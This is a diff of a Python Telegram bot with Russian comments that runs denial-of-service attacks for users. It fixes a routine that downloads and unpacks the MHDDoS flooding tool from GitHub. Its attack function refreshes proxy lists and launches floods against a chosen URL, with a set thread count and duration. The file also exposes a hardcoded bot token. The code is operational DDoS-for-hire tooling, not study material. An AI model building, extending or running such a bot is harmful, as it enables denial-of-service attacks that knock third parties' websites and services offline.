@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-MHDDoS БОТ — ВЕБХУК + АВТОЗАГРУЗКА MHDDoS
+MHDDoS БОТ — ВЕБХУК + АВТОЗАГРУЗКА MHDDoS (исправленная распаковка)
 """
 
 import asyncio
@@ -29,7 +29,6 @@ from aiohttp import web
 BOT_TOKEN = "8984259381:AAHAc-dorORjD-G0Ci2lLnwf_kbbzqqCxkg"
 ADMINS = [8264264137]
 
-# Путь к start.py (если его нет, скачаем)
 MH_DDOS_PATH = "start.py"
 PROXIES_FILE = "proxies.txt"
 DATA_FILE = "users.json"
@@ -44,10 +43,10 @@ except:
     UA_AVAILABLE = False
 
 # ==============================
-#  АВТОЗАГРУЗКА MHDDOS (если нет start.py)
+#  АВТОЗАГРУЗКА MHDDOS (исправлена)
 # ==============================
 def ensure_mhddos():
-    """Если start.py отсутствует, скачиваем MHDDoS с GitHub"""
+    """Если start.py отсутствует, скачиваем MHDDoS с GitHub и распаковываем"""
     if os.path.exists(MH_DDOS_PATH):
         return
     print("⬇️ MHDDoS не найден, скачиваю...")
@@ -56,17 +55,18 @@ def ensure_mhddos():
         r = requests.get(url, timeout=30)
         if r.status_code == 200:
             with zipfile.ZipFile(io.BytesIO(r.content)) as z:
-                # Извлекаем все файлы в текущую папку
                 for file in z.namelist():
-                    if file.startswith("MHDDoS-main/"):
+                    if file.startswith("MHDDoS-main/") and not file.endswith("/"):
                         new_name = file.replace("MHDDoS-main/", "")
-                        if new_name:  # не корень
-                            data = z.read(file)
-                            with open(new_name, "wb") as f:
-                                f.write(data)
+                        # Создаём папки, если нужно
+                        if "/" in new_name:
+                            os.makedirs(os.path.dirname(new_name), exist_ok=True)
+                        data = z.read(file)
+                        with open(new_name, "wb") as f:
+                            f.write(data)
             print("✅ MHDDoS загружен и распакован.")
         else:
-            print("❌ Не удалось скачать MHDDoS.")
+            print(f"❌ Не удалось скачать MHDDoS, статус {r.status_code}")
     except Exception as e:
         print(f"❌ Ошибка загрузки: {e}")
 
@@ -205,15 +205,14 @@ def update_proxies():
     return 0
 
 # ==============================
-#  АТАКА (используем скачанный MHDDoS)
+#  АТАКА
 # ==============================
 active_attacks = {}
 
 async def run_attack(user_id, method, url, threads, duration):
-    # Обновляем прокси перед атакой
     update_proxies()
-    # Проверяем, что start.py существует
     if not os.path.exists(MH_DDOS_PATH):
+        # Если start.py не найден, пытаемся загрузить ещё раз
         await asyncio.get_event_loop().run_in_executor(None, ensure_mhddos)
         if not os.path.exists(MH_DDOS_PATH):
             raise Exception("MHDDoS не найден и не удалось скачать.")
